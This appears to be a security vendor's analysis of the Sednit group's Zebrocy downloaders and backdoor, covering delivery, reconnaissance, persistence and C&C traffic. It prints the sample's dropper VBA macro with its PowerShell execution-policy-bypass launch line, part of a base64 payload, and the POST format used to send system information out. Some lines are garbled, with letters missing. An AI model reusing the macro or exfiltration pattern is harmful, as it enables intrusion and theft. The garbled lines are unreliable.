Kaspersky mentioned this component for the first time in 2017 in their APT trend report and recently wrote an article where they](https://securelist.com/apt-trends-report-q2-2017/79332/)\nquickly described it under the name Zebrocy.\n\n[This new component is a family of malware, comprising downloaders and backdoors written in Delphi and](https://en.wikipedia.org/wiki/Delphi_(IDE)) [AutoIt. These components play the](https://en.wikipedia.org/wiki/AutoIt)\nsame role in the Sednit ecosystem as Seduploader — that of first-stage malware.\n\n\n-----\n\nct s e a e see ta geted by eb ocy a e ocated e ba ja, os a a d e ego a, gypt, Geo g a, a, a a sta, o ea,\nKyrgyzstan, Russia, Saudi Arabia, Serbia, Switzerland, Tajikistan, Turkey, Turkmenistan, Ukraine, Uruguay and Zimbabwe. These targets\ninclude embassies, ministries of foreign affairs, and diplomats.\n\nThe Zebrocy family consists of three components. In the order of deployment these are a Delphi downloader, an AutoIt downloader and a\nDelphi backdoor. Figure 1 shows the relationship between these components.\nIn this article we describe this family and how it can coexist with the older Seduploader reconnaissance tools. We will talk about some\nsimilarities to and differences from [Downdelph at the end.](https://www.welivesecurity.com/wp-content/uploads/2016/10/eset-sednit-full.pdf)\n\nFigure 1: The Sednit ecosystem\n\nFigure 1 shows the attack methods and active malware used by Sednit. Email attachments are the main entry point to the Sednit ecosystem.\n[DealersChoice is still being used, as research from Palo Alto Networks mentioned in this recent blogpost. Both Seduploader and Zebrocy are](https://researchcenter.paloaltonetworks.com/2018/03/unit42-sofacy-uses-dealerschoice-target-european-government-agency/)\nactively being delivered by the Sednit group through email attachments. Finally, after a reconnaissance phase, Xagent and Xtunnel are\ndeployed on the targets deemed interesting by the operators.\n\n## Attack methods\n\nThe first component of a Zebrocy-based attack arrives as an email message. Victims are lured into opening email attachments that can be\neither Microsoft Office documents, or an archive.\n\n## Malicious documents\n\n\n-----\n\na c ous docu e ts used by Sed t do oad t e st stage pay oad a sua as c o pp cat o s ( ), e p o ts o e e us g y a c\n[Data Exchange (DDE).](https://msdn.microsoft.com/en-us/library/windows/desktop/ms648774(v=vs.85).aspx)\nAt the end of 2017, the Sednit group launched two campaigns delivering two different malicious documents. The first was named Syria – New\nRussia provocations.doc and the second named Note Letter Mary Christmas Card.doc.\n\nFigure 2: Zebrocy’s malicious documents\n\nBoth malicious documents contain a VBA macro that creates a randomly-named file in %TEMP%. The malware executable is then decoded\n[and written into this file, which is then executed via a PowerShell command or via Scriptable Shell Objects.](https://msdn.microsoft.com/en-us/library/windows/desktop/bb776890(v=vs.85).aspx)\n\nVisual Basic\n\n\n-----\n\n1\n\n2\n\n3\n\n4\n\n5\n\n6\n\n7\n\n8\n\n9\n\n10\n\n11\n\n12\n\n13\n\n14\n\n15\n\n16\n\n17\n\n18\n\n19\n\n20\n\n21\n\n22\n\n23\n\n24\n\n25\n\n26\n\n27\n\n28\n\n29\n\n30\n\n31\n\n32\n\n33\n\n34\n\n35\n\n36\n\n37\n\n\n\n[...]\n\nSub AutoClose()\n\nOn Error Resume Next\n\nvAdd = \"\"\n\nFor I = 1 To 8\n\nvAdd = vAdd + Chr(97 + Rnd(20) * 25)\n\nNext\n\nvFileName = Environ(\"temp\") & \"\\\" + vAdd & \".e\" + \"x\" & \"e\"\n\nSaveNew vFileName, UserForm1.Label1.Caption\n\nApplication.Run \"XYZ\", vFileName, \"WScript.Shell\"\n\nEnd Sub\n\nPublic Function XYZ(vF, vW)\n\nvStr = \"powershell.exe -nop -Exec Bypass -Command Start-Process '\" + vF + \"';\"\n\nCall CreateObject(vW).Run(vStr, 0)\n\nEnd Function\n\n[...]\n\nTVpQAAIAAAAEAA8A//8AALgAAAAAAAAAQAAaAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n\nAAAAAAEAALoQAA4ftAnNIbgBTM0hkJBUaGlzIHByb2dyYW0gbXVzdCBiZSBydW4gdW5kZXIgV2lu\n\n[...]\n\n\n_Example of Visual Basic function and base64 encoded first stage from Syria – New Russia provocations.doc document._\n\n## Archives\n\n\n-----\n\nSo e ca pa g s a e used a a c e to d op t e st stage o t e ct co pute, at e t a O ce docu e t ac os e a c e s\npresumably delivered as an email attachment.\nAll first stage of the Zebrocy family are executables with an icon and a document-like filename intended to trick the victim as shown in the\nFigure3.\n\nFigure 3: Zebrocy first stage using a Word document icon\n\n## Delphi downloader\n\nA Delphi downloader is the first stage of the Zebrocy family, although we have seen some campaigns from the Sednit group using the AutoIt\nstage directly without using this downloader. Most of these Delphi downloader binaries use Office document icons or other icons like Windows\n[library, and sometimes these samples are packed with UPX. The purpose of this stage is quite straightforward: it retrieves a maximum of](https://upx.github.io/)\ninformation from the victim’s computer.\n\nWhen the malware is launched, a splash window pops up with a bogus error message and the filename of the dropped binary. For example, if\nthe filename is srsiymyw.exe, the filename that appears in the splash window will be srsiymyw.doc (see Figure 4). The pop-up’s purpose is to\ndistract the user so that he won’t think anything unusual is happening on his computer.\n\nFigure 4: Delphi downloader splash window\n\nIn fact, the downloader is busy creating a file under %TEMP% with a filename hardcoded in the binary (although at this stage, the file is\nempty). Persistence is implemented by adding a Windows registry entry under HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\ with\nthe path of the hardcoded filename.\n\nTo gather information, the malware creates a new process using the Windows API CreateProcess function with cmd.exe /c SYSTEMINFO &\nTASKLIST as lpCommandLine argument. Once the information is retrieved, it sends the result via a HTTP POST request to the C&C server\nhardcoded in the binary. It retries until it receives the next stage.\n\nDelphi downloader HTTP POST request\n\n\n-----\n\n1\n\n2\n\n3\n\n4\n\n5\n\n6\n\n7\n\n8\n\n9\n\n10\n\n11\n\n12\n\n13\n\n14\n\n15\n\n16\n\n17\n\n18\n\n19\n\n\nPOST (\\/[a-zA-Z0-9\\-\\_\\^\\.]*){3}\\.(php|dat)?fort=<SerialNumber_C> HTTP/1.0\n\nConnection: keep-alive\n\nContent-Type: application/x-www-form-urlencoded\n\nContent-Length: xxxx\n\nHost: <ip_address>\n\nAccept: text/html, */*\n\nAccept-Encoding: identity\n\nUser-Agent: Mozilla v5.1 (Windows NT 6.1; rv:6.0.1) Gecko/20100101 Firefox/6.0.1\n\npol=MM/DD/YYYY%20HH:MM:SS%20(AM|PM)%0D%0A<DriveListing>%0D%0A%0D%0A<Path_to_the_binary>%0D%0A%0D%0A<SYST\n& TASKLIST output>\n\n[...]\n\n\n_Delphi downloader HTTP POST request_\n\nOnce the request has been sent, the C&C server responds by sending the next stage, if the target is considered interesting by the operator.\nThe time elapsing between the sending of the report and the receipt of the payload is a few hours. This next stage is written into the file\ncreated earlier and executed.\n\n## AutoIt downloader\n\nThe AutoIt downloader is another layer of the reconnaissance phase during an infection of the victim computer. From this point onwards, two\nscenarios are possible: in the first one, the Delphi downloader is the first stage and the second stage – which is the AutoIt downloader – is a\nlightweight downloader. In the other scenario, the AutoIt downloader is the first stage and it has all functionalities of the Delphi downloader\nand even more.\n\nWhen the AutoIt downloader is the first stage it performs many reconnaissance functions. Even if this one shares some similarities with the\nDelphi downloader, such as the persistence mechanism and the splash window, it adds more granularity to the reconnaissance phase than\nthat of the Delphi downloader. Here is a non-exhaustive list of its capabilities:\n\nDetect sandbox and virtual environment\nGet list of installed software (via HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall)\nGet Windows version (32-bit or 64-bit)\nGet the process list\nGet hard drive information\nGet screenshot\nGet various information about the victim computer using Windows Management Instrumentation (WMI) objects, probably inspired by\ncode from this [GitHub repository](https://github.com/cornernote/autoit-poker_bot/blob/master/includes/vendor/CompInfo/CompInfo.au3)\n\nDepending on the previous stage, the name of the AutoIt binary is different. If the malware is dropped as the first stage, it has a document-like\nname. Otherwise it is given the name hardcoded in the Delphi downloader, as shown in Table 1.\n\n**Table 1: AutoIt binary filenames, depending of the first stage**\n\n**First Stage** **AutoIt binary Filenames**\n\n\n-----\n\n**Table 1: AutoIt binary filenames, depending of the first stage**\n\n**Delphi downloader** csrsvc.exe\n\n**Email attachment** Protocol List_20160606.exe\n\nThe purpose of this stage is more of less the same as the previous one. There are many different versions in the wild but all of them include\nat least the code to achieve the following:\n\nRetrieve the serial number of the hard drive C:\nUse network functions from winhttp.dll or winhttp.au3\nExecute the payload received from the C&C server\n\nIn the same way that the Delphi downloader has a splash window, the AutoIt also has a splash window when it comes from an email\nattachment – the AutoIt is the first stage. The splash screen is related to the binary icon. For example, an AutoIt downloader with Adobe\nReader as an icon displays a splash screen saying that the PDF file the victim would be expecting to be displayed is corrupted. An AutoIt\nbinary with a Word icon will display the following popup asking for a password. The password is not considered here; we think it’s just a way\nto distract the victim from the code’s real malicious activity.\n\nFigure 5: AutoIt downloader Word popup\n\n## Delphi backdoor\n\nThe Delphi backdoor is the final stage of the Zebrocy chain of components. We have seen Zebrocy downloading the Sednit group’s flagship\nbackdoor, Xagent, in the past.\n\nUnlike the previous components, this one has an internal version number that doesn’t seem to be related to a specific campaign. This version\nnumber has evolved over time, as shown in Table 2:\n\n**Table 2: Delphi backdoor internal version history**\n\n**PE timestamp** **version**\n\n2015-12-28 2.1\n\n2016-01-06 2.2\n\n2016-01-25 2.3\n\n2016-02-03 2.4\n\n2016-03-14 2.5\n\n2016-04-08 3.0\n\n2016-04-26 3.2\n\n2016-06-01 4.4\n\n2016-09-08 5.0\n\n2016-12-15 5.1\n\n2017-06-01 7.0\n\n2017-09-26 8.0\n\n2017-10-12 8.1\n\n2017-11-12 8.2\n\n2017-12-26 8.5\n\n\n-----\n\n**Table 2: Delphi backdoor internal version history**\n\n2018-01-09 8.6\n\n2017-12-18 10.1\n\n2018-01-09 10.2\n\n2018-01-16 10.3\n\n2018-01-18 11.0\n\n2018-02-07 12.0\n\n2018-03-05 13.0\n\n2018-03-06 13.1\n\n2018-03-14 14.0\n\n2018-03-28 14.1\n\nNotice that we don’t have the full visibility and we may have missed some versions of the backdoor. Besides, there is some overlap between\nversions meaning that some older versions are still used at the same time as newer versions.\n\nIn the next few paragraphs we will highlight some differences seen in the malware during its evolution.\n\nThe backdoor embeds a block of configuration. The configuration values change from one sample to another, but the list of configurable items\nstays the same. However, the way in which the configuration data are stored in the malware sample has evolved over time.\n\nThe first versions of the backdoor embedded the configuration data in plaintext, as shown in Figure 6.\n\nFigure 6: Delphi backdoor plaintext configuration data\n\nThen, in later versions, the malware’s authors encoded the configuration data as hexadecimal strings, as shown in Figure 7.\n\nFigure 7: Delphi backdoor encoded configuration data\n\nIn the latest versions, the configuration data is encrypted in the resources using the AES algorithm. Older versions stored it in the .text\nsection.\n\nThe configuration data contains:\n\n\n-----\n\nS eys to co u cate t t e C&C se e\nURLs with paths differing from one sample to another\nThe version of the malware\nThe windows registry key/value that ensures the persistence of the backdoor\nPath where temporary files are store (%APPDATA%)\nThe names of hidden directories to be created to store temporary files: the directory filenames are concatenated with the environment\nvariable (%APPDATA%)\n\n[Once the malware is set up, it executes callback functions via the Windows API function SetTimer. These callbacks allow the operator to](https://msdn.microsoft.com/en-us/library/windows/desktop/ms644906(v=vs.85).aspx)\nhandle many features and commands of the backdoor.\n\nTake a screenshot of the Desktop of the victim\nCapture keystrokes\nList drives/network resources\nRead/write into Windows registry\nCopy/move/delete a file system object\nExecute files or create scheduled tasks\n\nThe number of commands handled by the backdoor – about 30 – differs from one version to another.\nTo communicate with the C&C server, the backdoor stores the report of these functions into a temporary file. Then it will read the content of\nthe temporary file and send it on. These temporary files are stored in one of the hidden directories created during the set-up phase.\n\n\n1\n\n2\n\n3\n\n4\n\n5\n\n6\n\n7\n\n8\n\n9\n\n10\n\n11\n\n12\n\n13\n\n14\n\n15\n\n16\n\n17\n\n18\n\n19\n\n20\n\n21\n\n22\n\n23\n\n24\n\n25\n\n\nPOST (\\/[a-zA-Z0-9\\-\\_\\^\\.]*){3}\\.(php|dat).

The contents sent to the C&C server vary from\none command to another, but all contains at least the HDD serial number and the first four bytes of the computer name.\nFor example, HELLO corresponds to the first packet sent by the backdoor to establish contact with the C&C server. As shown below it\ncontains the date when the task was launched, the Delphi backdoor’s internal version number, the HDD serial number, the computer name\n(first four bytes), the command and the date when the backdoor was executed.\n\nStart: 1/4/2018 1:37:00 PM – [<vx.x>]:42424242ESET-HELLO-[2018-04-04 01-37-00]-315.TXT.\n\nThe second AES key in the configuration data is used to decrypt the answer from the C&C server.\nLike Seduploader, this backdoor is used to deploy Xagent on victim machines apparently deemed “interesting” by the operators after the\nreconnaissance phase.\n\n## Summary\n\n[A component written in Delphi is nothing new for the Sednit group, which has already used this language for Downdelph. However, even if](https://www.welivesecurity.com/wp-content/uploads/2016/10/eset-sednit-full.pdf)\nthis latest component has nothing else in common with Downdelph “technically speaking”, there are some points of interest worth\nmentioning.\n\nThe deployment methods are the same, both being delivered as an email attachment.\nWe saw Downdelph for the last time in September 2015, and the first sample of Zebrocy we saw in the wild was dated November 2015.\nBoth are written in Delphi.\n\nWe can hypothesize that the Sednit group abandoned one component and started to develop a new one. One thing that doesn’t change for\nthe group, however, are the mistakes they made:\n\nThe name of the scheduled task: Windiws\nThe function name that retrieves system information in the AutoIt downloader is _SOFWARE()\nMary instead of Merry in Note Letter Mary Christmas Card.doc\n\nThe byte arrays used by the Delphi backdoor as AES-256 keys are 38 bytes long instead of 32 bytes. It’s not a spelling error but probably due\nto a lack of attention.\n\nWe have seen Zebrocy being heavily used by the Sednit group over the last two years. Our analysis of the many new variants that appeared\non a regular basis since 2017 clearly indicates that Zebrocy is being actively maintained and improved by its author(s). We can consider it as\none of the stable, mature tools in Sednit’s arsenal, a tool that deserves to be monitored closely.\n\n## IoCs\n\n**Malicious documents**\n\n**SHA-1** **ESET Detection name**
